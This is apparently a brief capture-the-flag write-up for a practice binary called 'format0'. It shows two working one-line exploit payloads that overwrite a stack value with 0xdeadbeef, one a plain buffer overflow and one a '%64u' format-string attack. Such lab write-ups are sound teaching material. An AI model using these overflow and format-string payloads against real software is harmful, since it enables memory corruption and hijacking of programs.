#Format 0

For this challenge, I have spent quite a time to understand better about how to take advantage of format pointer stored on the stack.

At first, I tried to get the address of the target by modifying the script little a bit but then realize that I can just do bufferoverflow

```
./format0 $(python -c 'print "A" * 64 + "\xef\xbe\xad\xde') 
``` 

But then again, the point of this challenge is to take advantage of Format string vuln. Beside, they even said that it should be less than 10 bytes to solve this challenge.


using %u pop off 64 (buffer) and overwrite the pointer to deadbeef:

```
./format0 $(python -c 'print "%64u" + "\xef\xbe\xad\xde"')
```

And that`s it for this challenge.
